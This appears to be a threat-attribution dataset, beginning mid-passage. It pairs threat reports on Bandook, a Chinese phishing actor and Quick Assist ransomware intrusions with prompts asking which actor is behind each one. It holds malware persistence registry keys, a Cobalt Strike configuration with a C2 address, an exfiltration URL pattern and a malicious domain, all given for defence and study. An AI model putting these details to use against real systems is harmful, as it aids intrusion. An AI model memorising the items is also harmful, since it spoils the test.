variant uses less control code and makes a more precise division of tasks.    Payload  Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers.      The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy.    These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce).    Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism.    GUM Control Code  When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe.    Software\Microsoft\Windows\CurrentVersion\Run  Key name: SMC  Value: %APPDATA%\SMC\SMC.exe    Software\Microsoft\Windows NT\CurrentVersion\Winlogon  Key name: shell  Value: explorer.exe, %APPDATA%\SMC\SMC.exe    Software\Microsoft\Windows NT\CurrentVersion\Windows\  Key name: Load  Value: short path of %APPDATA%\SMC\SMC.exe    When the copy is SMC.cpl, the registry key and value are the following:    Software\Microsoft\Windows\CurrentVersion\Run  Key name: SMC  Value: %windir%\System32\controll.exe %APPDATA%\SMC\SMC.cpl  ACG Control Code  When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions.    An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it.    C2 Communication  First, Bandook sends victim information to its C2 server:    Figure 4: Traffic capture and AES decrypted data of the victim information.  Figure 4: Traffic capture and AES decrypted data of the victim information.  If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll.    Figure 5: @0133 can be found in fcd.dll.  Figure 5: @0133 can be found in fcd.dll.  Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants.    These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware.    The data from the C2 server has the following format:    {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~!    The first argument is the command, which is necessary. Arg2 to Arg6 are optional.    Below are four examples of actions that require multiple commands and actions that have complex mechanisms.      This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing.    Finally, Bandook sends the file specified by Arg2 to the C2 server.    This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file.    This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent directory}\Lib\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer.    Additionally, some commands send special data to the server:    This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge:      After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server.    Figure 8: The “AVE_MARIA” and number sent by Bandook.  Figure 8: The “AVE_MARIA” and number sent by Bandook.  If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include:    Open the Run dialog  Copy user data from Chrome to another folder and open another Chrome instance using a new directory and configurations. It uses the following command to help it run faster: cmd.exe /c start chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir={New folder}  Copy user data to another folder and open another Firefox instance with the copied profile  Execute Internet Explorer  Terminate Microsoft Edge, enable its Compatibility Mode, and open another Edge instance with a new directory and configurations. It uses the following command to help it run faster:  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir={New folder}  Access specified windows  In addition, there are three new commands compared to the 2021 variant:    This writes encrypted backup URLs to the registry key kPYXM under HKCU\Software\AkZhAyV0\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this:    {URL}|{URL}|{URL}|    Bandook will extract URLs and try these sequentially if the previous URL is unavailable.      This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file.    In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9.    Conclusion  This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections.
https://research.checkpoint.com/2024/sharp-dragon-expands-towards-africa-and-the-caribbean/	Since 2021, Check Point Research has been closely monitoring the activities of [PLACEHOLDER], a Chinese threat actor. Historical activities mostly consist of highly-targeted phishing emails, previously leading to the deployment of VictoryDLL or Soul framework.    While the final payloads [PLACEHOLDER] operators have deployed overtime changed, their modus operandi has been persistent, and more so, their targets, who have remained within the confines of South-East Asia in the years we were tracking them, up until recently.    In recent months, we have observed a significant shift in [PLACEHOLDER]’s activities and lures, now targeting governmental organizations in Africa and the Caribbean. Those activities very much align with known [PLACEHOLDER] modus operandi, and were characterized by compromising a high-profile email account to spread a phishing word document that leverages a remote template weaponized using RoyalRoad. Unlike previous activities, those lures were used to deploy Cobalt Strike Beacon.    * As part of an ongoing effort to avoid confusion with other vendors naming conventions, the name was changed.    Inter-Government Relations as an Attack Vector  Starting November 2023, we observed [PLACEHOLDER]’s increased interest in governmental entities in Africa and the Caribbean. This interest manifested by directly targeting government organizations within the two regions, by exploiting previously compromised entities in Southeast Asia. Utilizing highly-tailored lures that deal with relations between countries in South-East Asia and the two regions, [PLACEHOLDER] threat actors have established their first footholds in two new territories.    Figure 1- [PLACEHOLDER]’s shift to target Africa and the Caribbean</p>  <p><strong>[PLACEHOLDER]’s Cyber Activities in Africa</strong>  Figure 1- [PLACEHOLDER]’s shift to target Africa and the Caribbean  [PLACEHOLDER]’s Cyber Activities in Africa  The first identified phishing attack targeting Africa was sent out from Country A (South-East Asia) to Country B (Africa) in November of 2023, using a lure about industrial relations between countries in South-East Asia and Africa. The document is very thorough, and its contents were likely taken from an authentic correspondence between the two countries.      Figure 2 – Lure document targeting Country B in Africa    Following those lures, we’ve also observed direct targeting within Africa in January of 2024, originating from Country B, originally targeted in November, likely indicating some of the phishing attacks were successful.    [PLACEHOLDER]’s interest in Africa does not come in a vacuum, as we’ve observed a set of Chinese affiliated threat actors targeting the region lately. This is also correlated with observations made by other vendors, who observe sustained tasking toward targeting in the region. It appears that [PLACEHOLDER]’s activities are part of a larger effort carried out by Chinese threat actors.    [PLACEHOLDER]’s Activity in the Caribbean  In a similar manner to Africa, [PLACEHOLDER]’s operators have utilized their previous access to compromised governmental entities in South-East Asia Country A to target governmental organizations in Country C, which is in the Caribbean. The first set of identified malicious documents sent out from the compromised network was sent out in December of 2023 and used a Caribbean Commonwealth meeting lure, named “Caribbean Clerks Programme”. This lure was sent out to a Foreign Affairs ministry of Country C.      Figure 3 – Caribbean-themed lure sent to a Southeast Asian government.    Not long afterwards, in January of 2024, much like in Africa, Country C compromised governmental email infrastructure was used to send out a large-scale phishing campaign targeting a wide set of governments in the Caribbean, this time, using a lure of a legitimate – looking survey around the Opioid threat in the Eastern Caribbean.    Figure 4 - One of the lures sent to governmental entities in the  Caribbean region  Figure 4 – One of the lures sent to governmental entities in the Caribbean region  Technical Analysis    Figure 5 – [PLACEHOLDER]’s Infection chain since May 2023 campaign  In our ongoing efforts to track [PLACEHOLDER] activities, we’ve identified various minor changes in their Tactics, Techniques, and Procedures (TTPs), while the core functionality remains consistent. Those changes reflect a more careful target selection and operational security (OPSEC) awareness. Among those changes are:    Wider Recon Collection  The 5.t downloader now conducts more thorough reconnaissance on target systems, this includes examining process lists and enumerating folders, leading to a more discerning selection of potential victims.    HTN:<hostname>  OSN:<os name>  OSV:<os version>  URN:<username>  ITF:NetworkCard:1 <Network card info> NetworkCard:2 <Network card info> ... ;  PGF:[Program Files]-><list of subfolders>|[Program Files (x86)]-><list of subfolders>  PSL:([System Process])<list of running processes>  Cobalt Strike Payload  Additionally, we observed a change in the delivered payload: if the machine is deemed attractive by the attackers, a payload is sent. When Check Point Research first exposed this operation in 2021, the payload was VictoryDll, a custom and unique malware enabling remote access and data collection from infected devices. Subsequently, as we continued tracking [PLACEHOLDER]’s operations, we observed the adoption of the SoulSearcher framework.    Presently, we are witnessing the use of Cobalt Strike Beacon as the payload of the 5.t downloader. This choice provides backdoor functionalities, such as C2 communication and command execution, without the risk of exposing their custom tools. However, we assume that the Cobalt Strike beacon serves as their primary tool for assessing the attacked environment, while their custom tools come into play at a later stage, which we have yet to witness. This refined approach indicates a deeper understanding of their targets and a desire to minimize exposure, likely resulting from public disclosures of their activities.    Cobalt Strike Configuration:    {  "config_type": "static",  "spawnto_x64": "%windir%\\sysnative\\Locator.exe",  "spawnto_x86": "%windir%\\syswow64\\Locator.exe",  "uses_cookies": "True",  "bstagecleanup": "True",  "crypto_scheme": 0,  "proxy_behavior": "Use IE settings",  "server,get-uri": "103.146.78.152,/ajax/libs/json2/20160511/json_parse_state.js",  "http_get_header": [  "Const_header Accept: application/*, image/*, text/html",  "Const_header Accept-Language: es",  "Const_header Accept-Encoding: compress, br",  "Build Metadata",  "XOR mask w/ random key",  "Base64 URL-safe decode",  "Prepend JV6_IB4QESMW4TOIQLJRX69Q7LPGNXW594C5=",  "Build End",  "Header Cookie"  ]  }  EXE Loaders  Another notable change is observed in the 5.t downloaders: some of the latest samples deviate from the usual DLL-based loaders, incorporating EXE-based 5.t loader samples. While not all the latest samples have shifted to DLLs, this change underscores the dynamic nature of their evolving strategies.    Recently [PLACEHOLDER] has also introduced another executable, altering the initial phase of the infection chain. Instead of relying on a Word document utilizing remote template to download an RTF file weaponized with RoyalRoad, they started using executables disguised as documents. This new method closely resembles the previous infection chain, as the executable writes 5.t DLL loader and executes it, while also creating a scheduled task for persistence.      Figure 6 – [PLACEHOLDER]’s new infection chain  Compromised Infrastructure  [PLACEHOLDER] not only utilized compromised government infrastructure to target other governments but also shifted from dedicated servers to using compromised servers as C&C servers. During a campaign conducted in May 2023, our team observed that certain servers used by [PLACEHOLDER] as C2 were likely legitimate servers that were compromised. Our suspicion is that [PLACEHOLDER] exploited the CVE-2023-0669 vulnerability, which is a flaw in the GoAnywhere platform allowing for pre-authentication command injection, this vulnerability was disclosed shortly before the incidents occurred.    The data collected from the affected machine was subsequently sent to the following address: https://<C2_addres>:<port>/G0AnyWhere_up.jsp?Data=. This address masquerades as belonging to the GoAnywhere service, a file transfer software.    Conclusion  This research highlights [PLACEHOLDER]’s strategic shift towards Africa and the Caribbean, suggesting its part in a broader effort carried out by Chinese cyber actors to enhance their presence and influence in these two regions. This move comes after a considerable period of activity in South-East Asia, which was leveraged by [PLACEHOLDER] actors, to establish initial footholds in countries in Africa and the Caribbean.    These changes in [PLACEHOLDER]’s tactics, showing more careful selection of targets and the use of publicy and readily available tools, is an indication of a refined approach by this threat actor to target high-profile organizations. These findings bring attention to the evolving nature of Chinese threat actors, especially towards regions that have been somewhat overlooked in global cybersecurity and by the threat intelligence community.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Since 2021, Check Point Research has been closely monitoring the activities of [PLACEHOLDER], a Chinese threat actor. Historical activities mostly consist of highly-targeted phishing emails, previously leading to the deployment of VictoryDLL or Soul framework.    While the final payloads [PLACEHOLDER] operators have deployed overtime changed, their modus operandi has been persistent, and more so, their targets, who have remained within the confines of South-East Asia in the years we were tracking them, up until recently.    In recent months, we have observed a significant shift in [PLACEHOLDER]’s activities and lures, now targeting governmental organizations in Africa and the Caribbean. Those activities very much align with known [PLACEHOLDER] modus operandi, and were characterized by compromising a high-profile email account to spread a phishing word document that leverages a remote template weaponized using RoyalRoad. Unlike previous activities, those lures were used to deploy Cobalt Strike Beacon.    * As part of an ongoing effort to avoid confusion with other vendors naming conventions, the name was changed.    Inter-Government Relations as an Attack Vector  Starting November 2023, we observed [PLACEHOLDER]’s increased interest in governmental entities in Africa and the Caribbean. This interest manifested by directly targeting government organizations within the two regions, by exploiting previously compromised entities in Southeast Asia. Utilizing highly-tailored lures that deal with relations between countries in South-East Asia and the two regions, [PLACEHOLDER] threat actors have established their first footholds in two new territories.    Figure 1- [PLACEHOLDER]’s shift to target Africa and the Caribbean</p>  <p><strong>[PLACEHOLDER]’s Cyber Activities in Africa</strong>  Figure 1- [PLACEHOLDER]’s shift to target Africa and the Caribbean  [PLACEHOLDER]’s Cyber Activities in Africa  The first identified phishing attack targeting Africa was sent out from Country A (South-East Asia) to Country B (Africa) in November of 2023, using a lure about industrial relations between countries in South-East Asia and Africa. The document is very thorough, and its contents were likely taken from an authentic correspondence between the two countries.      Figure 2 – Lure document targeting Country B in Africa    Following those lures, we’ve also observed direct targeting within Africa in January of 2024, originating from Country B, originally targeted in November, likely indicating some of the phishing attacks were successful.    [PLACEHOLDER]’s interest in Africa does not come in a vacuum, as we’ve observed a set of Chinese affiliated threat actors targeting the region lately. This is also correlated with observations made by other vendors, who observe sustained tasking toward targeting in the region. It appears that [PLACEHOLDER]’s activities are part of a larger effort carried out by Chinese threat actors.    [PLACEHOLDER]’s Activity in the Caribbean  In a similar manner to Africa, [PLACEHOLDER]’s operators have utilized their previous access to compromised governmental entities in South-East Asia Country A to target governmental organizations in Country C, which is in the Caribbean. The first set of identified malicious documents sent out from the compromised network was sent out in December of 2023 and used a Caribbean Commonwealth meeting lure, named “Caribbean Clerks Programme”. This lure was sent out to a Foreign Affairs ministry of Country C.      Figure 3 – Caribbean-themed lure sent to a Southeast Asian government.    Not long afterwards, in January of 2024, much like in Africa, Country C compromised governmental email infrastructure was used to send out a large-scale phishing campaign targeting a wide set of governments in the Caribbean, this time, using a lure of a legitimate – looking survey around the Opioid threat in the Eastern Caribbean.    Figure 4 - One of the lures sent to governmental entities in the  Caribbean region  Figure 4 – One of the lures sent to governmental entities in the Caribbean region  Technical Analysis    Figure 5 – [PLACEHOLDER]’s Infection chain since May 2023 campaign  In our ongoing efforts to track [PLACEHOLDER] activities, we’ve identified various minor changes in their Tactics, Techniques, and Procedures (TTPs), while the core functionality remains consistent. Those changes reflect a more careful target selection and operational security (OPSEC) awareness. Among those changes are:    Wider Recon Collection  The 5.t downloader now conducts more thorough reconnaissance on target systems, this includes examining process lists and enumerating folders, leading to a more discerning selection of potential victims.    HTN:<hostname>  OSN:<os name>  OSV:<os version>  URN:<username>  ITF:NetworkCard:1 <Network card info> NetworkCard:2 <Network card info> ... ;  PGF:[Program Files]-><list of subfolders>|[Program Files (x86)]-><list of subfolders>  PSL:([System Process])<list of running processes>  Cobalt Strike Payload  Additionally, we observed a change in the delivered payload: if the machine is deemed attractive by the attackers, a payload is sent. When Check Point Research first exposed this operation in 2021, the payload was VictoryDll, a custom and unique malware enabling remote access and data collection from infected devices. Subsequently, as we continued tracking [PLACEHOLDER]’s operations, we observed the adoption of the SoulSearcher framework.    Presently, we are witnessing the use of Cobalt Strike Beacon as the payload of the 5.t downloader. This choice provides backdoor functionalities, such as C2 communication and command execution, without the risk of exposing their custom tools. However, we assume that the Cobalt Strike beacon serves as their primary tool for assessing the attacked environment, while their custom tools come into play at a later stage, which we have yet to witness. This refined approach indicates a deeper understanding of their targets and a desire to minimize exposure, likely resulting from public disclosures of their activities.    Cobalt Strike Configuration:    {  "config_type": "static",  "spawnto_x64": "%windir%\\sysnative\\Locator.exe",  "spawnto_x86": "%windir%\\syswow64\\Locator.exe",  "uses_cookies": "True",  "bstagecleanup": "True",  "crypto_scheme": 0,  "proxy_behavior": "Use IE settings",  "server,get-uri": "103.146.78.152,/ajax/libs/json2/20160511/json_parse_state.js",  "http_get_header": [  "Const_header Accept: application/*, image/*, text/html",  "Const_header Accept-Language: es",  "Const_header Accept-Encoding: compress, br",  "Build Metadata",  "XOR mask w/ random key",  "Base64 URL-safe decode",  "Prepend JV6_IB4QESMW4TOIQLJRX69Q7LPGNXW594C5=",  "Build End",  "Header Cookie"  ]  }  EXE Loaders  Another notable change is observed in the 5.t downloaders: some of the latest samples deviate from the usual DLL-based loaders, incorporating EXE-based 5.t loader samples. While not all the latest samples have shifted to DLLs, this change underscores the dynamic nature of their evolving strategies.    Recently [PLACEHOLDER] has also introduced another executable, altering the initial phase of the infection chain. Instead of relying on a Word document utilizing remote template to download an RTF file weaponized with RoyalRoad, they started using executables disguised as documents. This new method closely resembles the previous infection chain, as the executable writes 5.t DLL loader and executes it, while also creating a scheduled task for persistence.      Figure 6 – [PLACEHOLDER]’s new infection chain  Compromised Infrastructure  [PLACEHOLDER] not only utilized compromised government infrastructure to target other governments but also shifted from dedicated servers to using compromised servers as C&C servers. During a campaign conducted in May 2023, our team observed that certain servers used by [PLACEHOLDER] as C2 were likely legitimate servers that were compromised. Our suspicion is that [PLACEHOLDER] exploited the CVE-2023-0669 vulnerability, which is a flaw in the GoAnywhere platform allowing for pre-authentication command injection, this vulnerability was disclosed shortly before the incidents occurred.    The data collected from the affected machine was subsequently sent to the following address: https://<C2_addres>:<port>/G0AnyWhere_up.jsp?Data=. This address masquerades as belonging to the GoAnywhere service, a file transfer software.    Conclusion  This research highlights [PLACEHOLDER]’s strategic shift towards Africa and the Caribbean, suggesting its part in a broader effort carried out by Chinese cyber actors to enhance their presence and influence in these two regions. This move comes after a considerable period of activity in South-East Asia, which was leveraged by [PLACEHOLDER] actors, to establish initial footholds in countries in Africa and the Caribbean.    These changes in [PLACEHOLDER]’s tactics, showing more careful selection of targets and the use of publicy and readily available tools, is an indication of a refined approach by this threat actor to target high-profile organizations. These findings bring attention to the evolving nature of Chinese threat actors, especially towards regions that have been somewhat overlooked in global cybersecurity and by the threat intelligence community.
https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/	Since mid-April 2024, Microsoft Threat Intelligence has observed the threat actor [PLACEHOLDER] misusing the client management tool Quick Assist to target users in social engineering attacks. [PLACEHOLDER] is a financially motivated cybercriminal group known to deploy [PLACEHOLDER] ransomware. The observed activity begins with impersonation through voice phishing (vishing), followed by delivery of malicious tools, including remote monitoring and management (RMM) tools like ScreenConnect and NetSupport Manager, malware like Qakbot, Cobalt Strike, and ultimately [PLACEHOLDER] ransomware.    MITIGATE THIS THREAT    Get recommendations   Quick Assist is an application that enables a user to share their Windows or macOS device with another person over a remote connection. This enables the connecting user to remotely connect to the receiving user’s device and view its display, make annotations, or take full control, typically for troubleshooting. Threat actors misuse Quick Assist features to perform social engineering attacks by pretending, for example, to be a trusted contact like Microsoft technical support or an IT professional from the target user’s company to gain initial access to a target device.    RANSOMWARE AS A SERVICE    Protect users and orgs   In addition to protecting customers from observed malicious activity, Microsoft is investigating the use of Quick Assist in these attacks and is working on improving the transparency and trust between helpers and sharers, and incorporating warning messages in Quick Assist to alert users about possible tech support scams. Microsoft Defender for Endpoint detects components of activity originating from Quick Assist sessions as well as follow-on activity, and Microsoft Defender Antivirus detects the malware components associated with this activity.    TECH SUPPORT SCAMS    Report scam   Organizations can also reduce the risk of attacks by blocking or uninstalling Quick Assist and other remote management tools if the tools are not in use in their environment. Quick Assist is installed by default on devices running Windows 11. Additionally, tech support scams are an industry-wide issue where scammers use scare tactics to trick users into unnecessary technical support services. Educating users on how to recognize such scams can significantly reduce the impact of social engineering attacks.     Social engineering  One of the social engineering techniques used by threat actors to obtain initial access to target devices using Quick Assist is through vishing attacks. Vishing attacks are a form of social engineering that involves callers luring targets into revealing sensitive information under false pretenses or tricking targets into carrying out actions on behalf of the caller.    For example, threat actors might attempt to impersonate IT or help desk personnel, pretending to conduct generic fixes on a device. In other cases, threat actors initiate link listing attacks – a type of email bombing attack, where threat actors sign up targeted emails to multiple email subscription services to flood email addresses indirectly with subscribed content. Following the email flood, the threat actor impersonates IT support through phone calls to the target user, claiming to offer assistance in remediating the spam issue.    At the end of May 2024, Microsoft observed [PLACEHOLDER] using Microsoft Teams to send messages to target users in addition to phone calls. Tenants created by the threat actor are used to impersonate help desk personnel with names displayed as “Help Desk”, “Help Desk IT”, “Help Desk Support”, and “IT Support”. Microsoft has taken action to mitigate this by suspending identified accounts and tenants associated with inauthentic behavior. Apply security best practices for Microsoft Teams to safeguard Teams users.    During the call, the threat actor persuades the user to grant them access to their device through Quick Assist. The target user only needs to press CTRL + Windows + Q and enter the security code provided by the threat actor, as shown in the figure below.    Screenshot of Quick Assist prompt to enter security code  Figure 1. Quick Assist prompt to enter security code  After the target enters the security code, they receive a dialog box asking for permission to allow screen sharing. Selecting Allow shares the user’s screen with the actor.    Screenshot of Quick Assist dialog box asking permission to allow screen sharing  Figure 2. Quick Assist dialog box asking permission to allow screen sharing  Once in the session, the threat actor can select Request Control, which if approved by the target, grants the actor full control of the target’s device.    Screenshot of Quick Assist dialog box asking permission to allow control  Figure 3. Quick Assist dialog box asking permission to allow control  Follow-on activity leading to [PLACEHOLDER] ransomware  Once the user allows access and control, the threat actor runs a scripted cURL command to download a series of batch files or ZIP files used to deliver malicious payloads. Some of the batch scripts observed reference installing fake spam filter updates requiring the targets to provide sign-in credentials. In several cases, Microsoft Threat Intelligence identified such activity leading to the download of Qakbot, RMM tools like ScreenConnect and NetSupport Manager, and Cobalt Strike.    Screenshot of two lines of cURL commands  Figure 4. Examples of cURL commands to download batch files and ZIP files  Qakbot has been used over the years as a remote access vector to deliver additional malicious payloads that led to ransomware deployment. In this recent activity, Qakbot was used to deliver a Cobalt Strike Beacon attributed to [PLACEHOLDER].    ScreenConnect was used to establish persistence and conduct lateral movement within the compromised environment. NetSupport Manager is a remote access tool used by multiple threat actors to maintain control over compromised devices. An attacker might use this tool to remotely access the device, download and install additional malware, and launch arbitrary commands.    The mentioned RMM tools are commonly used by threat actors because of their extensive capabilities and ability to blend in with the environment. In some cases, the actors leveraged the OpenSSH tunneling tool to establish a secure shell (SSH) tunnel for persistence.     After the threat actor installs the initial tooling and the phone call is concluded, [PLACEHOLDER] leverages their access and performs further hands-on-keyboard activities such as domain enumeration and lateral movement.    In cases where [PLACEHOLDER] relies on Teams messages followed by phone calls and remote access through Quick Assist, the threat actor uses BITSAdmin to download batch files and ZIP files from a malicious site, for example antispam3[.]com. [PLACEHOLDER] also provides the target user with malicious links that redirect the user to an EvilProxy phishing site to input credentials. EvilProxy is an adversary-in-the-middle (AiTM) phishing kit used to capture passwords, hijack a user’s sign-in session, and skip the authentication process. [PLACEHOLDER] was also observed deploying SystemBC, a post-compromise commodity remote access trojan (RAT) and proxy tool typically used to establish command-and-control communication, establish persistence in a compromised environment, and deploy follow-on malware, notably ransomware.    In several cases, [PLACEHOLDER] uses PsExec to deploy [PLACEHOLDER] ransomware throughout the network. [PLACEHOLDER] is a closed ransomware offering (exclusive and not openly marketed like ransomware as a service) distributed by a small number of threat actors who typically rely on other threat actors for initial access, malicious infrastructure, and malware development. Since [PLACEHOLDER] first appeared in April 2022, [PLACEHOLDER] attackers have deployed the ransomware after receiving access from Qakbot and other malware distributors, highlighting the need for organizations to focus on attack stages prior to ransomware deployment to reduce the threat. In the next sections, we share recommendations for improving defenses against this threat, including best practices when using Quick Assist and mitigations for reducing the impact of [PLACEHOLDER] and other ransomware.    Recommendations  Microsoft recommends the following best practices to protect users and organizations from attacks and threat actors that misuse Quick Assist:    Consider blocking or uninstalling Quick Assist and other remote monitoring and management tools if these tools are not in use in your environment. If your organization utilizes another remote support tool such as Remote Help, block or remove Quick Assist as a best practice. Remote Help is part of the Microsoft Intune Suite and provides authentication and security controls for helpdesk connections.  Educate users about protecting themselves from tech support scams. Tech support scams are an industry-wide issue where scammers use scary tactics to trick users into unnecessary technical support services.  Only allow a helper to connect to your device using Quick Assist if you initiated the interaction by contacting Microsoft Support or your IT support staff directly. Don’t provide access to anyone claiming to have an urgent need to access your device.  If you suspect that the person connecting to your device is conducting malicious activity, disconnect from the session immediately and report to your local authorities and/or any relevant IT members within your organization.  Users who have been affected by a tech support scam can also use the Microsoft technical support scam form to report it.  Microsoft recommends the following mitigations to reduce the impact of this threat:    Educate users about protecting personal and business information in social media, filtering unsolicited communication, identifying lure links in phishing emails, and reporting reconnaissance attempts and other suspicious activity.  Educate users about preventing malware infections, such as ignoring or deleting unsolicited and unexpected emails or attachments sent through instant messaging applications or social networks as well as suspicious phone calls.  Invest in advanced anti-phishing solutions that monitor incoming emails and visited websites. Microsoft Defender for Office 365 brings together incident and alert management across email, devices, and identities, centralizing investigations for email-based threats.  Educate Microsoft Teams users to verify ‘External’ tagging on communication attempts from external entities, be cautious about what they share, and never share their account information or authorize sign-in requests over chat.  Implement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps.  Apply Microsoft’s security best practices for Microsoft Teams to safeguard Teams users.  Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.  Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.  Turn on tamper protection features to prevent attackers from stopping security services.  Enable investigation and remediation in full automated mode to allow Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.  Refer to Microsoft’s human-operated ransomware overview for general hardening recommendations against ransomware attacks.  Microsoft Defender XDR customers can turn on attack surface reduction rules to prevent common attack techniques:    Block executable files from running unless they meet a prevalence, age, or trusted list criterion  Block execution of potentially obfuscated scripts  Block process creations originating from PSExec and WMI commands  Use advanced protection against ransomware  Detection details  Microsoft Defender Antivirus   Microsoft Defender Antivirus detects Qakbot downloaders, implants, and behavior as the following malware:    TrojanDownloader:O97M/Qakbot  Trojan:Win32/QBot  Trojan:Win32/Qakbot  TrojanSpy:Win32/Qakbot  Behavior:Win32/Qakbot  [PLACEHOLDER] threat components are detected as the following:    Behavior:Win32/Basta  Ransom:Win32/Basta  Trojan:Win32/Basta  Microsoft Defender Antivirus detects Beacon running on a victim process as the following:    Behavior:Win32/CobaltStrike  Backdoor:Win64/CobaltStrike  HackTool:Win64/CobaltStrike  Additional Cobalt Strike components are detected as the following:    TrojanDropper:PowerShell/Cobacis  Trojan:Win64/TurtleLoader.CS  Exploit:Win32/ShellCode.BN  SystemBC components are detected as:    Behavior:Win32/SystemBC  Trojan: Win32/SystemBC  Microsoft Defender for Endpoint  Alerts with the following title in the security center can indicate threat activity on your network:    Suspicious activity using Quick Assist  The following alerts might also indicate activity related to this threat. Note, however, that these alerts can also be triggered by unrelated threat activity.    Suspicious curl behavior  Suspicious bitsadmin activity  Suspicious file creation by BITSAdmin tool  A file or network connection related to a ransomware-linked emerging threat activity group detected —This alert captures [PLACEHOLDER] activity  Ransomware-linked emerging threat activity group Storm-0303 detected — This alert captures some Qakbot distributor activity  Possible Qakbot activity  Possible NetSupport Manager activity  Possibly malicious use of proxy or tunneling tool  Suspicious usage of remote management software  Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)  Human-operated attack using Cobalt Strike  Human-operated attack implant tool detected  Ransomware behavior detected in the file system	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Since mid-April 2024, Microsoft Threat Intelligence has observed the threat actor [PLACEHOLDER] misusing the client management tool Quick Assist to target users in social engineering attacks. [PLACEHOLDER] is a financially motivated cybercriminal group known to deploy [PLACEHOLDER] ransomware. The observed activity begins with impersonation through voice phishing (vishing), followed by delivery of malicious tools, including remote monitoring and management (RMM) tools like ScreenConnect and NetSupport Manager, malware like Qakbot, Cobalt Strike, and ultimately [PLACEHOLDER] ransomware.    MITIGATE THIS THREAT    Get recommendations   Quick Assist is an application that enables a user to share their Windows or macOS device with another person over a remote connection. This enables the connecting user to remotely connect to the receiving user’s device and view its display, make annotations, or take full control, typically for troubleshooting. Threat actors misuse Quick Assist features to perform social engineering attacks by pretending, for example, to be a trusted contact like Microsoft technical support or an IT professional from the target user’s company to gain initial access to a target device.    RANSOMWARE AS A SERVICE    Protect users and orgs   In addition to protecting customers from observed malicious activity, Microsoft is investigating the use of Quick Assist in these attacks and is working on improving the transparency and trust between helpers and sharers, and incorporating warning messages in Quick Assist to alert users about possible tech support scams. Microsoft Defender 